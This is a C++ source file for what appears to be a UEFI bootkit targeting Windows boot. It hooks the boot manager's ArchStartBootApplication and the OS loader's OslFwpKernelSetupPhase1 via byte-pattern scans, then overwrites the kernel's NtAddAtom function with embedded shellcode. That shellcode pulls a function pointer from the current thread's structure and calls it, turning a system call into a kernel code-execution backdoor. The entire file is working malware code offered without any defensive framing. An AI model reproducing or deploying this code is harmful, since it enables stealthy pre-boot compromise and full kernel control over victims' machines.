#include "patch.hpp"
#include "..\hook\hook.hpp"
#include "dependencies/utilities/utilities.hpp"
#include "dependencies/pe/pe.hpp"
#include "..\bootmgfw\bootmgfw.hpp"
#include "dependencies/std.h"

INLINE_HOOK osl_fwp_kernel_hook;
INLINE_HOOK nt_hook;

std::uint64_t nt_add_atom;
std::uint64_t dbg_print; 

unsigned char shellcode[] = {
	0x48, 0x83, 0xEC, 0x40,									// sub rsp, 0x40
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,   // mov rax, gs:[0x188]
	0x4C, 0x8B, 0x90, 0xF0, 0x00, 0x00, 0x00,				// mov r10, [rax+0xf0]
	0x4D, 0x8B, 0x9A, 0x38, 0x11, 0x00, 0x00,				// mov r11, [r10+0x1138]
	0x4D, 0x8B, 0x00,										// mov r8, [r11]
	0x49, 0x8B, 0x49, 0x08,									// mov rcx, [r11 + 0x8]
	0x41, 0xFF, 0xD0,										// call r8
	0x48, 0x83, 0xC4, 0x40									// add rsp, 0x40
};

EFI_STATUS EFIAPI patch::osl_fwp_kernel_setup_phase1_hook(LOADER_PARAMETER_BLOCK* loaderParameterBlock)
{
	hook::disable_inline_hook(&osl_fwp_kernel_hook);

	KLDR_DATA_TABLE_ENTRY* ntoskrnl = pe::get_module_entry(&loaderParameterBlock->LoadOrderListHead, (CHAR16*)L"ntoskrnl.exe");

	void* ntoskrnl_image_base = ntoskrnl->ImageBase;

	dbg_print = pe::get_export_address(std::uint64_t(ntoskrnl_image_base), "DbgPrint");
	nt_add_atom = pe::get_export_address(std::uint64_t(ntoskrnl_image_base), "NtAddAtom");

	if (nt_add_atom && dbg_print)
	{
		//pe::disable_wp();

		utils::copy_memory((void*)nt_add_atom, shellcode, sizeof shellcode);

		//pe::enable_wp();
	}
	else {
		infinity_loop();
	}
	return OSL_FWP_KERNEL_SETUP_PHASE_1(osl_fwp_kernel_hook.address)(loaderParameterBlock);
}

EFI_STATUS EFIAPI patch::arch_start_boot_application_hook(VOID* entry, VOID* image_base, UINT32 image_size, UINT8 boot_option, VOID* return_args)
{
	hook::disable_inline_hook(&fw_hook);

	gST->ConOut->ClearScreen(gST->ConOut);

	VOID* fn = pe::find_pattern_ex((CHAR8*)image_base, image_size, (CHAR8*)"\x74\x07\xE8\x00\x00\x00\x00\x8B\xD8", (CHAR8*)"xxx????xx");

	if (!fn) {
		sleep(sec_to_ms(3));
		return ((IMG_ARCH_START_BOOT_APPLICATION)fw_hook.address)(entry, image_base, image_size, boot_option, return_args);
	}

	VOID* func = pe::find_pattern_ex((CHAR8*)relative_address((CHAR8*)fn + 2, 5), 0x4F,
		(CHAR8*)"\x48\x8B\xCF\xE8", (CHAR8*)"xxxx");

	if (!func) {
		sleep(sec_to_ms(3));
		return ((IMG_ARCH_START_BOOT_APPLICATION)fw_hook.address)(entry, image_base, image_size, boot_option, return_args);
	}

	hook::inline_hook(&osl_fwp_kernel_hook, (relative_address((UINT8*)func + 3, 5)), osl_fwp_kernel_setup_phase1_hook, TRUE);

	return ((IMG_ARCH_START_BOOT_APPLICATION)fw_hook.address)(entry, image_base, image_size, boot_option, return_args);
}
